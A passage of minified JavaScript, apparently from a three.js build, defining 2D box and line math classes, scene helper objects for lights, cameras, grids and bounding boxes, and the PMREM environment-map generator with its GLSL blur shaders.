this.min.sub(e),this.max.add(e),this},t.expandByScalar=function(e){return this.min.addScalar(-e),this.max.addScalar(e),this},t.containsPoint=function(e){return!(e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y)},t.containsBox=function(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y},t.getParameter=function(e,t){return void 0===t&&(t=new ie),t.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y))},t.intersectsBox=function(e){return!(e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y)},t.clampPoint=function(e,t){return void 0===t&&(t=new ie),t.copy(e).clamp(this.min,this.max)},t.distanceToPoint=function(e){return Jc.copy(e).clamp(this.min,this.max).sub(e).length()},t.intersect=function(e){return this.min.max(e.min),this.max.min(e.max),this},t.union=function(e){return this.min.min(e.min),this.max.max(e.max),this},t.translate=function(e){return this.min.add(e),this.max.add(e),this},t.equals=function(e){return e.min.equals(this.min)&&e.max.equals(this.max)},e}(),eu=new he,tu=new he,nu=function(){function e(e,t){this.start=void 0!==e?e:new he,this.end=void 0!==t?t:new he}var t=e.prototype;return t.set=function(e,t){return this.start.copy(e),this.end.copy(t),this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.start.copy(e.start),this.end.copy(e.end),this},t.getCenter=function(e){return void 0===e&&(e=new he),e.addVectors(this.start,this.end).multiplyScalar(.5)},t.delta=function(e){return void 0===e&&(e=new he),e.subVectors(this.end,this.start)},t.distanceSq=function(){return this.start.distanceToSquared(this.end)},t.distance=function(){return this.start.distanceTo(this.end)},t.at=function(e,t){return void 0===t&&(t=new he),this.delta(t).multiplyScalar(e).add(this.start)},t.closestPointToPointParameter=function(e,t){eu.subVectors(e,this.start),tu.subVectors(this.end,this.start);var n=tu.dot(tu),r=tu.dot(eu)/n;return t&&(r=J.clamp(r,0,1)),r},t.closestPointToPoint=function(e,t,n){var r=this.closestPointToPointParameter(e,t);return void 0===n&&(n=new he),this.delta(n).multiplyScalar(r).add(this.start)},t.applyMatrix4=function(e){return this.start.applyMatrix4(e),this.end.applyMatrix4(e),this},t.equals=function(e){return e.start.equals(this.start)&&e.end.equals(this.end)},e}();function ru(e){pt.call(this),this.material=e,this.render=function(){},this.hasPositions=!1,this.hasNormals=!1,this.hasColors=!1,this.hasUvs=!1,this.positionArray=null,this.normalArray=null,this.colorArray=null,this.uvArray=null,this.count=0}((ru.prototype=Object.create(pt.prototype)).constructor=ru).prototype.isImmediateRenderObject=!0;var iu=new he,au=function(e){function t(t,n){var r;(r=e.call(this)||this).light=t,r.light.updateMatrixWorld(),r.matrix=t.matrixWorld,r.matrixAutoUpdate=!1,r.color=n;for(var i=new sn,a=[0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,-1,0,1,0,0,0,0,1,1,0,0,0,0,-1,1],o=0,s=1;o<32;o++,s++){var l=o/32*Math.PI*2,c=s/32*Math.PI*2;a.push(Math.cos(l),Math.sin(l),1,Math.cos(c),Math.sin(c),1)}i.setAttribute("position",new qt(a,3));var u=new La({fog:!1,toneMapped:!1});return r.cone=new Ha(i,u),r.add(r.cone),r.update(),r}te(t,e);var n=t.prototype;return n.dispose=function(){this.cone.geometry.dispose(),this.cone.material.dispose()},n.update=function(){this.light.updateMatrixWorld();var e=this.light.distance?this.light.distance:1e3,t=e*Math.tan(this.light.angle);this.cone.scale.set(t,t,e),iu.setFromMatrixPosition(this.light.target.matrixWorld),this.cone.lookAt(iu),void 0!==this.color?this.cone.material.color.set(this.color):this.cone.material.color.copy(this.light.color)},t}(pt),ou=new he,su=new $e,lu=new $e,cu=function(e){function t(t){for(var n,r=function e(t){var n=[];t&&t.isBone&&n.push(t);for(var r=0;r<t.children.length;r++)n.push.apply(n,e(t.children[r]));return n}(t),i=new sn,a=[],o=[],s=new Lt(0,0,1),l=new Lt(0,1,0),c=0;c<r.length;c++){var u=r[c];u.parent&&u.parent.isBone&&(a.push(0,0,0),a.push(0,0,0),o.push(s.r,s.g,s.b),o.push(l.r,l.g,l.b))}i.setAttribute("position",new qt(a,3)),i.setAttribute("color",new qt(o,3));var d=new La({vertexColors:!0,depthTest:!1,depthWrite:!1,toneMapped:!1,transparent:!0});return(n=e.call(this,i,d)||this).type="SkeletonHelper",n.isSkeletonHelper=!0,n.root=t,n.bones=r,n.matrix=t.matrixWorld,n.matrixAutoUpdate=!1,n}return te(t,e),t.prototype.updateMatrixWorld=function(t){var n=this.bones,r=this.geometry,i=r.getAttribute("position");lu.getInverse(this.root.matrixWorld);for(var a=0,o=0;a<n.length;a++){var s=n[a];s.parent&&s.parent.isBone&&(su.multiplyMatrices(lu,s.matrixWorld),ou.setFromMatrixPosition(su),i.setXYZ(o,ou.x,ou.y,ou.z),su.multiplyMatrices(lu,s.parent.matrixWorld),ou.setFromMatrixPosition(su),i.setXYZ(o+1,ou.x,ou.y,ou.z),o+=2)}r.getAttribute("position").needsUpdate=!0,e.prototype.updateMatrixWorld.call(this,t)},t}(Ha),uu=function(e){function t(t,n,r){var i,a=new ds(n,4,2),o=new Rt({wireframe:!0,fog:!1,toneMapped:!1});return(i=e.call(this,a,o)||this).light=t,i.light.updateMatrixWorld(),i.color=r,i.type="PointLightHelper",i.matrix=i.light.matrixWorld,i.matrixAutoUpdate=!1,i.update(),i}te(t,e);var n=t.prototype;return n.dispose=function(){this.geometry.dispose(),this.material.dispose()},n.update=function(){void 0!==this.color?this.material.color.set(this.color):this.material.color.copy(this.light.color)},t}(Sn),du=new he,pu=new Lt,hu=new Lt,fu=function(e){function t(t,n,r){var i;(i=e.call(this)||this).light=t,i.light.updateMatrixWorld(),i.matrix=t.matrixWorld,i.matrixAutoUpdate=!1,i.color=r;var a=new ts(n);a.rotateY(.5*Math.PI),i.material=new Rt({wireframe:!0,fog:!1,toneMapped:!1}),void 0===i.color&&(i.material.vertexColors=!0);var o=a.getAttribute("position"),s=new Float32Array(3*o.count);return a.setAttribute("color",new $t(s,3)),i.add(new Sn(a,i.material)),i.update(),i}te(t,e);var n=t.prototype;return n.dispose=function(){this.children[0].geometry.dispose(),this.children[0].material.dispose()},n.update=function(){var e=this.children[0];if(void 0!==this.color)this.material.color.set(this.color);else{var t=e.geometry.getAttribute("color");pu.copy(this.light.color),hu.copy(this.light.groundColor);for(var n=0,r=t.count;n<r;n++){var i=n<r/2?pu:hu;t.setXYZ(n,i.r,i.g,i.b)}t.needsUpdate=!0}e.lookAt(du.setFromMatrixPosition(this.light.matrixWorld).negate())},t}(pt),Au=function(e){function t(t,n,r,i){var a;t=t||10,n=n||10,r=new Lt(void 0!==r?r:4473924),i=new Lt(void 0!==i?i:8947848);for(var o=n/2,s=t/n,l=t/2,c=[],u=[],d=0,p=0,h=-l;d<=n;d++,h+=s){c.push(-l,0,h,l,0,h),c.push(h,0,-l,h,0,l);var f=d===o?r:i;f.toArray(u,p),p+=3,f.toArray(u,p),p+=3,f.toArray(u,p),p+=3,f.toArray(u,p),p+=3}var A=new sn;A.setAttribute("position",new qt(c,3)),A.setAttribute("color",new qt(u,3));var m=new La({vertexColors:!0,toneMapped:!1});return(a=e.call(this,A,m)||this).type="GridHelper",a}return te(t,e),t}(Ha),mu=function(e){function t(t,n,r,i,a,o){var s;t=t||10,n=n||16,r=r||8,i=i||64,a=new Lt(void 0!==a?a:4473924),o=new Lt(void 0!==o?o:8947848);for(var l=[],c=[],u=0;u<=n;u++){var d=u/n*(2*Math.PI),p=Math.sin(d)*t,h=Math.cos(d)*t;l.push(0,0,0),l.push(p,0,h);var f=1&u?a:o;c.push(f.r,f.g,f.b),c.push(f.r,f.g,f.b)}for(var A=0;A<=r;A++)for(var m=1&A?a:o,v=t-t/r*A,g=0;g<i;g++){var y=g/i*(2*Math.PI),b=Math.sin(y)*v,_=Math.cos(y)*v;l.push(b,0,_),c.push(m.r,m.g,m.b),y=(g+1)/i*(2*Math.PI),b=Math.sin(y)*v,_=Math.cos(y)*v,l.push(b,0,_),c.push(m.r,m.g,m.b)}var w=new sn;w.setAttribute("position",new qt(l,3)),w.setAttribute("color",new qt(c,3));var C=new La({vertexColors:!0,toneMapped:!1});return(s=e.call(this,w,C)||this).type="PolarGridHelper",s}return te(t,e),t}(Ha),vu=new he,gu=new he,yu=new he,bu=function(e){function t(t,n,r){var i;(i=e.call(this)||this).light=t,i.light.updateMatrixWorld(),i.matrix=t.matrixWorld,i.matrixAutoUpdate=!1,i.color=r,void 0===n&&(n=1);var a=new sn;a.setAttribute("position",new qt([-n,n,0,n,n,0,n,-n,0,-n,-n,0,-n,n,0],3));var o=new La({fog:!1,toneMapped:!1});return i.lightPlane=new Ua(a,o),i.add(i.lightPlane),(a=new sn).setAttribute("position",new qt([0,0,0,0,0,1],3)),i.targetLine=new Ua(a,o),i.add(i.targetLine),i.update(),i}te(t,e);var n=t.prototype;return n.dispose=function(){this.lightPlane.geometry.dispose(),this.lightPlane.material.dispose(),this.targetLine.geometry.dispose(),this.targetLine.material.dispose()},n.update=function(){vu.setFromMatrixPosition(this.light.matrixWorld),gu.setFromMatrixPosition(this.light.target.matrixWorld),yu.subVectors(gu,vu),this.lightPlane.lookAt(gu),void 0!==this.color?(this.lightPlane.material.color.set(this.color),this.targetLine.material.color.set(this.color)):(this.lightPlane.material.color.copy(this.light.color),this.targetLine.material.color.copy(this.light.color)),this.targetLine.lookAt(gu),this.targetLine.scale.z=yu.length()},t}(pt),_u=new he,wu=new Fn,Cu=function(e){function t(t){var n,r=new sn,i=new La({color:16777215,vertexColors:!0,toneMapped:!1}),a=[],o=[],s={},l=new Lt(16755200),c=new Lt(16711680),u=new Lt(43775),d=new Lt(16777215),p=new Lt(3355443);function h(e,t,n){f(e,n),f(t,n)}function f(e,t){a.push(0,0,0),o.push(t.r,t.g,t.b),void 0===s[e]&&(s[e]=[]),s[e].push(a.length/3-1)}return h("n1","n2",l),h("n2","n4",l),h("n4","n3",l),h("n3","n1",l),h("f1","f2",l),h("f2","f4",l),h("f4","f3",l),h("f3","f1",l),h("n1","f1",l),h("n2","f2",l),h("n3","f3",l),h("n4","f4",l),h("p","n1",c),h("p","n2",c),h("p","n3",c),h("p","n4",c),h("u1","u2",u),h("u2","u3",u),h("u3","u1",u),h("c","t",d),h("p","c",p),h("cn1","cn2",p),h("cn3","cn4",p),h("cf1","cf2",p),h("cf3","cf4",p),r.setAttribute("position",new qt(a,3)),r.setAttribute("color",new qt(o,3)),(n=e.call(this,r,i)||this).type="CameraHelper",n.camera=t,n.camera.updateProjectionMatrix&&n.camera.updateProjectionMatrix(),n.matrix=t.matrixWorld,n.matrixAutoUpdate=!1,n.pointMap=s,n.update(),n}return te(t,e),t.prototype.update=function(){var e=this.geometry,t=this.pointMap;wu.projectionMatrixInverse.copy(this.camera.projectionMatrixInverse),xu("c",t,e,wu,0,0,-1),xu("t",t,e,wu,0,0,1),xu("n1",t,e,wu,-1,-1,-1),xu("n2",t,e,wu,1,-1,-1),xu("n3",t,e,wu,-1,1,-1),xu("n4",t,e,wu,1,1,-1),xu("f1",t,e,wu,-1,-1,1),xu("f2",t,e,wu,1,-1,1),xu("f3",t,e,wu,-1,1,1),xu("f4",t,e,wu,1,1,1),xu("u1",t,e,wu,.7,1.1,-1),xu("u2",t,e,wu,-.7,1.1,-1),xu("u3",t,e,wu,0,2,-1),xu("cf1",t,e,wu,-1,0,1),xu("cf2",t,e,wu,1,0,1),xu("cf3",t,e,wu,0,-1,1),xu("cf4",t,e,wu,0,1,1),xu("cn1",t,e,wu,-1,0,-1),xu("cn2",t,e,wu,1,0,-1),xu("cn3",t,e,wu,0,-1,-1),xu("cn4",t,e,wu,0,1,-1),e.getAttribute("position").needsUpdate=!0},t}(Ha);function xu(e,t,n,r,i,a,o){_u.set(i,a,o).unproject(r);var s=t[e];if(void 0!==s)for(var l=n.getAttribute("position"),c=0,u=s.length;c<u;c++)l.setXYZ(s[c],_u.x,_u.y,_u.z)}var Su,ku,Mu,Bu=new me,Eu=function(e){function t(t,n){var r;void 0===n&&(n=16776960);var i=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),a=new Float32Array(24),o=new sn;return o.setIndex(new $t(i,1)),o.setAttribute("position",new $t(a,3)),(r=e.call(this,o,new La({color:n,toneMapped:!1}))||this).object=t,r.type="BoxHelper",r.matrixAutoUpdate=!1,r.update(),r}te(t,e);var n=t.prototype;return n.update=function(e){if(void 0!==this.object&&Bu.setFromObject(this.object),!Bu.isEmpty()){var t=Bu.min,n=Bu.max,r=this.geometry.attributes.position,i=r.array;i[0]=n.x,i[1]=n.y,i[2]=n.z,i[3]=t.x,i[4]=n.y,i[5]=n.z,i[6]=t.x,i[7]=t.y,i[8]=n.z,i[9]=n.x,i[10]=t.y,i[11]=n.z,i[12]=n.x,i[13]=n.y,i[14]=t.z,i[15]=t.x,i[16]=n.y,i[17]=t.z,i[18]=t.x,i[19]=t.y,i[20]=t.z,i[21]=n.x,i[22]=t.y,i[23]=t.z,r.needsUpdate=!0,this.geometry.computeBoundingSphere()}},n.setFromObject=function(e){return this.object=e,this.update(),this},n.copy=function(e){return Ha.prototype.copy.call(this,e),this.object=e.object,this},t}(Ha),Tu=function(e){function t(t,n){var r;void 0===n&&(n=16776960);var i=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),a=new sn;return a.setIndex(new $t(i,1)),a.setAttribute("position",new qt([1,1,1,-1,1,1,-1,-1,1,1,-1,1,1,1,-1,-1,1,-1,-1,-1,-1,1,-1,-1],3)),(r=e.call(this,a,new La({color:n,toneMapped:!1}))||this).box=t,r.type="Box3Helper",r.geometry.computeBoundingSphere(),r}return te(t,e),t.prototype.updateMatrixWorld=function(t){var n=this.box;n.isEmpty()||(n.getCenter(this.position),n.getSize(this.scale),this.scale.multiplyScalar(.5),e.prototype.updateMatrixWorld.call(this,t))},t}(Ha),Pu=function(e){function t(t,n,r){var i,a=void 0!==r?r:16776960,o=new sn;o.setAttribute("position",new qt([1,-1,1,-1,1,1,-1,-1,1,1,1,1,-1,1,1,-1,-1,1,1,-1,1,1,1,1,0,0,1,0,0,0],3)),o.computeBoundingSphere(),(i=e.call(this,o,new La({color:a,toneMapped:!1}))||this).type="PlaneHelper",i.plane=t,i.size=void 0===n?1:n;var s=new sn;return s.setAttribute("position",new qt([1,1,1,-1,1,1,-1,-1,1,1,1,1,-1,-1,1,1,-1,1],3)),s.computeBoundingSphere(),i.add(new Sn(s,new Rt({color:a,opacity:.2,transparent:!0,depthWrite:!1,toneMapped:!1}))),i}return te(t,e),t.prototype.updateMatrixWorld=function(t){var n=-this.plane.constant;Math.abs(n)<1e-8&&(n=1e-8),this.scale.set(.5*this.size,.5*this.size,n),this.children[0].material.side=n<0?1:0,this.lookAt(this.plane.normal),e.prototype.updateMatrixWorld.call(this,t)},t}(Ua),Iu=new he,Fu=function(e){function t(t,n,r,i,a,o){var s;return(s=e.call(this)||this).type="ArrowHelper",void 0===t&&(t=new he(0,0,1)),void 0===n&&(n=new he(0,0,0)),void 0===r&&(r=1),void 0===i&&(i=16776960),void 0===a&&(a=.2*r),void 0===o&&(o=.2*a),void 0===Su&&((Su=new sn).setAttribute("position",new qt([0,0,0,0,1,0],3)),(ku=new uo(0,.5,1,5,1)).translate(0,-.5,0)),s.position.copy(n),s.line=new Ua(Su,new La({color:i,toneMapped:!1})),s.line.matrixAutoUpdate=!1,s.add(s.line),s.cone=new Sn(ku,new Rt({color:i,toneMapped:!1})),s.cone.matrixAutoUpdate=!1,s.add(s.cone),s.setDirection(t),s.setLength(r,a,o),s}te(t,e);var n=t.prototype;return n.setDirection=function(e){if(.99999<e.y)this.quaternion.set(0,0,0,1);else if(e.y<-.99999)this.quaternion.set(1,0,0,0);else{Iu.set(e.z,0,-e.x).normalize();var t=Math.acos(e.y);this.quaternion.setFromAxisAngle(Iu,t)}},n.setLength=function(e,t,n){void 0===t&&(t=.2*e),void 0===n&&(n=.2*t),this.line.scale.set(1,Math.max(1e-4,e-t),1),this.line.updateMatrix(),this.cone.scale.set(n,t,n),this.cone.position.y=e,this.cone.updateMatrix()},n.setColor=function(e){this.line.material.color.set(e),this.cone.material.color.set(e)},n.copy=function(t){return e.prototype.copy.call(this,t,!1),this.line.copy(t.line),this.cone.copy(t.cone),this},t}(pt),Lu=function(e){function t(t){var n;void 0===t&&(t=1);var r=[0,0,0,t,0,0,0,0,0,0,t,0,0,0,0,0,0,t],i=new sn;i.setAttribute("position",new qt(r,3)),i.setAttribute("color",new qt([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1],3));var a=new La({vertexColors:!0,toneMapped:!1});return(n=e.call(this,i,a)||this).type="AxesHelper",n}return te(t,e),t}(Ha),Ou=Math.pow(2,8),Nu=[.125,.215,.35,.446,.526,.582],Du=5+Nu.length,Ru=((Mu={})[D]=0,Mu[R]=1,Mu[U]=2,Mu[$]=3,Mu[z]=4,Mu[H]=5,Mu[j]=6,Mu),ju=new jl,Uu=function(){for(var e=[],t=[],n=[],r=8,i=0;i<Du;i++){var a=Math.pow(2,r);t.push(a);var o=1/a;4<i?o=Nu[i-8+4-1]:0==i&&(o=0),n.push(o);for(var s=1/(a-1),l=-s/2,c=1+s/2,u=[l,l,c,l,c,c,l,l,c,c,l,c],d=new Float32Array(108),p=new Float32Array(72),h=new Float32Array(36),f=0;f<6;f++){var A=f%3*2/3-1,m=2<f?0:-1,v=[A,m,0,A+2/3,m,0,A+2/3,m+1,0,A,m,0,A+2/3,m+1,0,A,m+1,0];d.set(v,18*f),p.set(u,12*f);var g=[f,f,f,f,f,f];h.set(g,6*f)}var y=new sn;y.setAttribute("position",new $t(d,3)),y.setAttribute("uv",new $t(p,2)),y.setAttribute("faceIndex",new $t(h,1)),e.push(y),4<r&&r--}return{_lodPlanes:e,_sizeLods:t,_sigmas:n}}(),$u=Uu._lodPlanes,zu=Uu._sizeLods,Hu=Uu._sigmas,Vu=null,Qu=(1+Math.sqrt(5))/2,Gu=1/Qu,Wu=[new he(1,1,1),new he(-1,1,1),new he(1,1,-1),new he(-1,1,-1),new he(0,Qu,Gu),new he(0,Qu,-Gu),new he(Gu,0,Qu),new he(-Gu,0,Qu),new he(Qu,Gu,0),new he(-Qu,Gu,0)],Ku=function(){function e(e){this._renderer=e,this._pingPongRenderTarget=null,this._blurMaterial=(20,new ks({name:"SphericalGaussianBlur",defines:{n:20},uniforms:{envMap:{value:null},samples:{value:1},weights:{value:new Float32Array(20)},latitudinal:{value:!1},dTheta:{value:0},mipInt:{value:0},poleAxis:{value:new he(0,1,0)},inputEncoding:{value:Ru[D]},outputEncoding:{value:Ru[D]}},vertexShader:"\n\n\t\tprecision mediump float;\n\t\tprecision mediump int;\n\n\t\tattribute vec3 position;\n\t\tattribute vec2 uv;\n\t\tattribute float faceIndex;\n\n\t\tvarying vec3 vOutputDirection;\n\n\t\t// RH coordinate system; PMREM face-indexing convention\n\t\tvec3 getDirection( vec2 uv, float face ) {\n\n\t\t\tuv = 2.0 * uv - 1.0;\n\n\t\t\tvec3 direction = vec3( uv, 1.0 );\n\n\t\t\tif ( face == 0.0 ) {\n\n\t\t\t\tdirection = direction.zyx; // ( 1, v, u ) pos x\n\n\t\t\t} else if ( face == 1.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xz *= -1.0; // ( -u, 1, -v ) pos y\n\n\t\t\t} else if ( face == 2.0 ) {\n\n\t\t\t\tdirection.x *= -1.0; // ( -u, v, 1 ) pos z\n\n\t\t\t} else if ( face == 3.0 ) {\n\n\t\t\t\tdirection = direction.zyx;\n\t\t\t\tdirection.xz *= -1.0; // ( -1, v, -u ) neg x\n\n\t\t\t} else if ( face == 4.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xy *= -1.0; // ( -u, -1, v ) neg y\n\n\t\t\t} else if ( face == 5.0 ) {\n\n\t\t\t\tdirection.z *= -1.0; // ( u, v, -1 ) neg z\n\n\t\t\t}\n\n\t\t\treturn direction;\n\n\t\t}\n\n\t\tvoid main() {\n\n\t\t\tvOutputDirection = getDirection( uv, faceIndex );\n\t\t\tgl_Position = vec4( position, 1.0 );\n\n\t\t}\n\t",fragmentShader:"\n\n\t\t\tprecision mediump float;\n\t\t\tprecision mediump int;\n\n\t\t\tvarying vec3 vOutputDirection;\n\n\t\t\tuniform sampler2D envMap;\n\t\t\tuniform int samples;\n\t\t\tuniform float weights[ n ];\n\t\t\tuniform bool latitudinal;\n\t\t\tuniform float dTheta;\n\t\t\tuniform float mipInt;\n\t\t\tuniform vec3 poleAxis;\n\n\t\t\t\n\n\t\tuniform int inputEncoding;\n\t\tuniform int outputEncoding;\n\n\t\t#include <encodings_pars_fragment>\n\n\t\tvec4 inputTexelToLinear( vec4 value ) {\n\n\t\t\tif ( inputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else if ( inputEncoding == 1 ) {\n\n\t\t\t\treturn sRGBToLinear( value );\n\n\t\t\t} else if ( inputEncoding == 2 ) {\n\n\t\t\t\treturn RGBEToLinear( value );\n\n\t\t\t} else if ( inputEncoding == 3 ) {\n\n\t\t\t\treturn RGBMToLinear( value, 7.0 );\n\n\t\t\t} else if ( inputEncoding == 4 ) {\n\n\t\t\t\treturn RGBMToLinear( value, 16.0 );\n\n\t\t\t} else if ( inputEncoding == 5 ) {\n\n\t\t\t\treturn RGBDToLinear( value, 256.0 );\n\n\t\t\t} else {\n\n\t\t\t\treturn GammaToLinear( value, 2.2 );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 linearToOutputTexel( vec4 value ) {\n\n\t\t\tif ( outputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else if ( outputEncoding == 1 ) {\n\n\t\t\t\treturn LinearTosRGB( value );\n\n\t\t\t} else if ( outputEncoding == 2 ) {\n\n\t\t\t\treturn LinearToRGBE( value );\n\n\t\t\t} else if ( outputEncoding == 3 ) {\n\n\t\t\t\treturn LinearToRGBM( value, 7.0 );\n\n\t\t\t} else if ( outputEncoding == 4 ) {\n\n\t\t\t\treturn LinearToRGBM( value, 16.0 );\n\n\t\t\t} else if ( outputEncoding == 5 ) {\n\n\t\t\t\treturn LinearToRGBD( value, 256.0 );\n\n\t\t\t} else {\n\n\t\t\t\treturn LinearToGamma( value, 2.2 );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 envMapTexelToLinear( vec4 color ) {\n\n\t\t\treturn inputTexelToLinear( color );\n\n\t\t}\n\t\n\n\t\t\t#define ENVMAP_TYPE_CUBE_UV\n\t\t\t#include <cube_uv_reflection_fragment>\n\n\t\t\tvec3 getSample( float theta, vec3 axis ) {\n\n\t\t\t\tfloat cosTheta = cos( theta );\n\t\t\t\t// Rodrigues' axis-angle rotation\n\t\t\t\tvec3 sampleDirection = vOutputDirection * cosTheta\n\t\t\t\t\t+ cross( axis, vOutputDirection ) * sin( theta )\n\t\t\t\t\t+ axis * dot( axis, vOutputDirection ) * ( 1.0 - cosTheta );\n\n\t\t\t\treturn bilinearCubeUV( envMap, sampleDirection, mipInt );\n\n\t\t\t}\n\n\t\t\tvoid main() {\n\n\t\t\t\tvec3 axis = latitudinal ? poleAxis : cross( poleAxis, vOutputDirection );\n\n\t\t\t\tif ( all( equal( axis, vec3( 0.0 ) ) ) ) {\n\n\t\t\t\t\taxis = vec3( vOutputDirection.z, 0.0, - vOutputDirection.x );\n\n\t\t\t\t}\n\n\t\t\t\taxis = normalize( axis );\n\n\t\t\t\tgl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );\n\t\t\t\tgl_FragColor.rgb += weights[ 0 ] * getSample( 0.0, axis );\n\n\t\t\t\tfor ( int i = 1; i < n; i++ ) {\n\n\t\t\t\t\tif ( i >= samples ) {\n\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t}\n\n\t\t\t\t\tfloat theta = dTheta * float( i );\n\t\t\t\t\tgl_FragColor.rgb += weights[ i ] * getSample( -1.0 * theta, axis );\n\t\t\t\t\tgl_FragColor.rgb += weights[ i ] * getSample( theta, axis );\n\n\t\t\t\t}\n\n\t\t\t\tgl_FragColor = linearToOutputTexel( gl_FragColor );\n\n\t\t\t}\n\t\t",blending:0,depthTest:!1,depthWrite:!1})),this._equirectShader=null,this._cubemapShader=null,this._compileMaterial(this._blurMaterial)}var t=e.prototype;return t.fromScene=function(e,t,n,r){void 0===t&&(t=0),void 0===n&&(n=.1),void 0===r&&(r=100),Vu=this._renderer.getRenderTarget();var i=this._allocateTargets();return this._sceneToCubeUV(e,n,r,i),0<t&&this._blur(i,0,0,t),this._applyPMREM(i),this._cleanup(i),i},t.fromEquirectangular=function(e){return this._fromTexture(e)},t.fromCubemap=function(e){return this._fromTexture(e)},t.compileCubemapShader=function(){null===this._cubemapShader&&(this._cubemapShader=Ju(),this._compileMaterial(this._cubemapShader))},t.compileEquirectangularShader=function(){null===this._equirectShader&&(this._equirectShader=Yu(),this._compileMaterial(this._equirectShader))},t.dispose=function(){this._blurMaterial.dispose(),null!==this._cubemapShader&&this._cubemapShader.dispose(),null!==this._equirectShader&&this._equirectShader.dispose();for(var e=0;e<$u.length;e++)$u[e].dispose()},t._cleanup=function(e){this._pingPongRenderTarget.dispose(),this._renderer.setRenderTarget(Vu),e.scissorTest=!1,Xu(e,0,0,e.width,e.height)},t._fromTexture=function(e){Vu=this._renderer.getRenderTarget();var t=this._allocateTargets(e);return this._textureToCubeUV(e,t),this._applyPMREM(t),this._cleanup(t),t},t._allocateTargets=function(e){var t,n={magFilter:d,minFilter:d,generateMipmaps:!1,type:v,format:1023,encoding:(t=e,void 0===t||t.type!==v||t.encoding!==D&&t.encoding!==R&&t.encoding!==j?U:e.encoding),depthBuffer:!1},r=qu(n);return r.depthBuffer=!e,this._pingPongRenderTarget=qu(n),r},t._compileMaterial=function(e){var t=new Sn($u[0],e);this._renderer.compile(t,ju)},t._sceneToCubeUV=function(e,t,n,r){var i=new Ln(90,1,t,n),a=[1,-1,1,1,1,1],o=[1,1,1,-1,-1,-1],s=this._renderer,l=s.outputEncoding,c=s.toneMapping,u=s.getClearColor(),d=s.getClearAlpha();s.toneMapping=0,s.outputEncoding=D;var p=e.background;if(p&&p.isColor){p.convertSRGBToLinear();var h=Math.max(p.r,p.g,p.b),f=Math.min(Math.max(Math.ceil(Math.log2(h)),-128),127);p=p.multiplyScalar(Math.pow(2,-f));var A=(f+128)/255;s.setClearColor(p,A),e.background=null}for(var m=0;m<6;m++){var v=m%3;0==v?(i.up.set(0,a[m],0),i.lookAt(o[m],0,0)):1==v?(i.up.set(0,0,a[m]),i.lookAt(0,o[m],0)):(i.up.set(0,a[m],0),i.lookAt(0,0,o[m])),Xu(r,v*Ou,2<m?Ou:0,Ou,Ou),s.setRenderTarget(r),s.render(e,i)}s.toneMapping=c,s.outputEncoding=l,s.setClearColor(u,d)},t._textureToCubeUV=function(e,t){var n=this._renderer;e.isCubeTexture?null==this._cubemapShader&&(this._cubemapShader=Ju()):null==this._equirectShader&&(this._equirectShader=Yu());var r=e.isCubeTexture?this._cubemapShader:this._equirectShader,i=new Sn($u[0],r),a=r.uniforms;(a.envMap.value=e).isCubeTexture||a.texelSize.value.set(1/e.image.width,1/e.image.height),a.inputEncoding.value=Ru[e.encoding],a.outputEncoding.value=Ru[t.texture.encoding],Xu(t,0,0,3*Ou,2*Ou),n.setRenderTarget(t),n.render(i,ju)},t._applyPMREM=function(e){var t=this._renderer,n=t.autoClear;t.autoClear=!1;for(var r=1;r<Du;r++){var i=Math.sqrt(Hu[r]*Hu[r]-Hu[r-1]*Hu[r-1]),a=Wu[(r-1)%Wu.length];this._blur(e,r-1,r,i,a)}t.autoClear=n},t._blur=function(e,t,n,r,i){var a=this._pingPongRenderTarget;this._halfBlur(e,a,t,n,r,"latitudinal",i),this._halfBlur(a,e,n,n,r,"longitudinal",i)},t._halfBlur=function(e,t,n,r,i,a,o){for(var s=this._renderer,l=this._blurMaterial,c=new Sn($u[r],l),u=l.uniforms,d=zu[n]-1,p=isFinite(i)?Math.PI/(2*d):2*Math.PI/39,h=i/p,f=isFinite(i)?1+Math.floor(3*h):20,A=[],m=0,v=0;v<20;++v){var g=v/h,y=Math.exp(-g*g/2);A.push(y),0==v?m+=y:v<f&&(m+=2*y)}for(var b=0;b<A.length;b++)A[b]=A[b]/m;u.envMap.value=e.texture,u.samples.value=f,u.weights.value=A,u.latitudinal.value="latitudinal"===a,o&&(u.poleAxis.value=o),u.dTheta.value=p,u.mipInt.value=8-n,u.inputEncoding.value=Ru[e.texture.encoding],u.outputEncoding.value=Ru[e.texture.encoding];var _=zu[r];Xu(t,3*Math.max(0,Ou-2*_),(0===r?0:2*Ou)+2*_*(4<r?r-8+4:0),3*_,2*_),s.setRenderTarget(t),s.render(c,ju)},e}();function qu(e){var t=new ue(3*Ou,3*Ou,e);return t.texture.mapping=o,t.texture.name="PMREM.cubeUv",t.scissorTest=!0,t}function Xu(e,t,n,r,i){e.viewport.set(t,n,r,i),e.scissor.set(t,n,r,i)}function Yu(){return new ks({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null},texelSize:{value:new ie(1,1)},inputEncoding:{value:Ru[D]},outputEncoding:{value:Ru[D]}},vertexShader:"\n\n\t\tprecision mediump float;\n\t\tprecision mediump int;\n\n\t\tattribute vec3 position;\n\t\tattribute vec2 uv;\n\t\tattribute float faceIndex;\n\n\t\tvarying vec3 vOutputDirection;\n\n\t\t// RH coordinate system; PMREM face-indexing convention\n\t\tvec3 getDirection( vec2 uv, float face ) 